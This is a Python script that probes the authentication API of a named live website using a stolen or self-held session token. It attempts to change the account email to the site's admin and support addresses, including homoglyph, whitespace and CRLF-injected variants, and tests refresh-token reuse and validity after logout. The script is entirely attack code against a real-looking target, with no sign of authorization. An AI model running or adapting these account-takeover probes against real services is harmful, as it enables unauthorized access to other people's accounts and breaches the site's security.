import ssl, json, urllib.request, urllib.error, urllib.parse, time, base64

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"

tokrec = json.loads(open("token.txt", encoding="utf-8").read())
TOK = tokrec["access_token"]
payload = json.loads(base64.urlsafe_b64decode(TOK.split(".")[1] + "=="))
print("our account sub:", payload["sub"], "email:", payload.get("email"), "exp:", payload.get("exp"))

def req(method, url, body=None, token=None):
    h = {"User-Agent": "Mozilla/5.0", "apikey": KEY, "Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=30, context=ctx) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, {}, str(e)

def show(tag, st, hd, body, n=400):
    print(f"[{tag}] {st} body={body[:n].replace(chr(10),' ')}")

print("\n===== A. GET /user (baseline) =====")
st, hd, b = req("GET", SUPA + "/auth/v1/user", token=TOK)
show("GET user", st, hd, b, 900)

print("\n===== B. email change to brand-new address (autoconfirm oracle) =====")
newmail = f"authflowprobe{int(time.time())}@dropmail.me"
st, hd, b = req("PUT", SUPA + "/auth/v1/user", {"email": newmail}, token=TOK)
show("PUT email -> fresh", st, hd, b, 700)
time.sleep(1)
st, hd, b = req("GET", SUPA + "/auth/v1/user", token=TOK)
show("GET user after", st, hd, b, 700)

print("\n===== C. email change to EXISTING admin emails (uniqueness oracle) =====")
for em in ["admin@onlyfakeai.ru", "ADMIN@ONLYFAKEAI.RU", "support@onlyfakeai.ru"]:
    st, hd, b = req("PUT", SUPA + "/auth/v1/user", {"email": em}, token=TOK)
    show("PUT email -> " + em, st, hd, b, 400)
    time.sleep(1.2)

print("\n===== D. email change with unicode / whitespace / case variants =====")
for em in ["аdmin@onlyfakeai.ru", "admin@onlyfakeai.ru ", "admin@onlyfakeai.ru.", "admin@onlyfakeai.ru\r\n"]:
    st, hd, b = req("PUT", SUPA + "/auth/v1/user", {"email": em}, token=TOK)
    show("PUT email -> " + repr(em), st, hd, b, 400)
    time.sleep(1.2)

print("\n===== E. refresh token rotation / reuse =====")
rt = tokrec.get("refresh_token")
print("have refresh_token:", bool(rt))
if rt:
    st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": rt})
    show("refresh #1", st, hd, b, 500)
    newrt = None
    oldtok = TOK
    try:
        nsess = json.loads(b)
        newrt = nsess.get("refresh_token")
        newat = nsess.get("access_token")
        print("rotated refresh differs:", newrt != rt, "| new access differs:", newat != TOK)
    except Exception:
        newat = None
    time.sleep(1.5)
    st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": rt})
    show("refresh reuse OLD token", st, hd, b, 500)
    time.sleep(1)
    if newrt:
        st, hd, b = req("POST", SUPA + "/auth/v1/token?grant_type=refresh_token", {"refresh_token": newrt})
        show("refresh new token (after reuse attempt)", st, hd, b, 400)
    # does the original access token still work after rotation/reuse?
    st, hd, b = req("GET", SUPA + "/auth/v1/user", token=oldtok)
    show("GET user with pre-rotation access token", st, hd, b, 200)

print("\n===== F. signed out / logout semantics =====")
for grant, body in [("password", {"email": "x@x", "password": "x"})]:
    pass
st, hd, b = req("POST", SUPA + "/auth/v1/logout", {}, token=TOK)
show("logout", st, hd, b, 200)
st, hd, b = req("GET", SUPA + "/auth/v1/user", token=TOK)
show("GET user after logout", st, hd, b, 200)
